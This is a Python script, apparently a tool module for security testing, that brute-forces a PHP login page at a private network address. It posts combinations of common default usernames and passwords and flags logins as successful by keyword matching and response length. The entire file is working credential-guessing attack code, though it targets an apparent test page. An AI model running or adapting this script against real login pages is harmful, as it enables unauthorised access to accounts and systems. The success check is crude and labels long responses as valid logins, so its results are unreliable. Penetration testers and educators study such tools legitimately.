
#!/usr/bin/env python3
"""
Brute force login module for PHP login page
"""

import requests
import itertools
from typing import List, Tuple, Optional

TAGS=["brute force", "login", "http", "password cracking", "security testing"]

def ability():
    """
    Perform brute force attack on the target login page
    """
    target_url="http://192.168.43.218/test/Brute-Force-php/brute-test.php"
    
    # Common username and password combinations to try
    usernames=["admin", "root", "test", "user", "administrator"]
    passwords=["password", "123456", "admin", "test", "root", "1234", "pass"]
    
    print(f"Starting brute force attack on: {target_url}")
    print(f"Trying {len(usernames)} usernames and {len(passwords)} passwords...")
    print("-" * 50)
    
    successful_attempts=[]
    
    for username, password in itertools.product(usernames, passwords):
        print(f"Trying: {username} / {password}")
        
        try:
            # Prepare the POST data for the login form
            data={
                'username': username,
                'password': password,
                'submit': 'Login'  # Common submit button name
            }
            
            # Send POST request to the login page
            response=requests.post(target_url, data=data, timeout=10)
            
            # Check if login was successful (common indicators)
            if response.status_code == 200:
                # Look for common success indicators in the response
                response_text=response.text.lower()
                
                # Common phrases that indicate successful login
                success_indicators=[
                    "welcome", "success", "logged in", "dashboard",
                    "login successful", "access granted"
                ]
                
                # Common failure indicators
                failure_indicators=[
                    "invalid", "wrong", "error", "failed", "incorrect",
                    "login failed", "access denied"
                ]
                
                # Check for success indicators
                has_success=any(indicator in response_text for indicator in success_indicators)
                has_failure=any(indicator in response_text for indicator in failure_indicators)
                
                if has_success and not has_failure:
                    successful_attempts.append((username, password))
                    print(f"✅ SUCCESS! Found valid credentials: {username} / {password}")
                elif "login" in response_text and "form" in response_text:
                    # Still shows login form - likely failed
                    pass
                else:
                    # Check response length as additional heuristic
                    if len(response_text) > 1000:  # Longer responses often mean successful login
                        successful_attempts.append((username, password))
                        print(f"✅ POTENTIAL SUCCESS (based on response length): {username} / {password}")
                    
        except requests.RequestException as e:
            print(f"❌ Error trying {username}/{password}: {e}")
            continue
    
    print("-" * 50)
    print("BRUTE FORCE ATTACK COMPLETED")
    
    if successful_attempts:
        print("🎯 SUCCESSFUL LOGINS FOUND:")
        for i, (user, pwd) in enumerate(successful_attempts, 1):
            print(f"{i}. Username: {user}, Password: {pwd}")
    else:
        print("❌ No valid credentials found with the current wordlist")
    
    return successful_attempts

if __name__ == "__main__":
    ability()
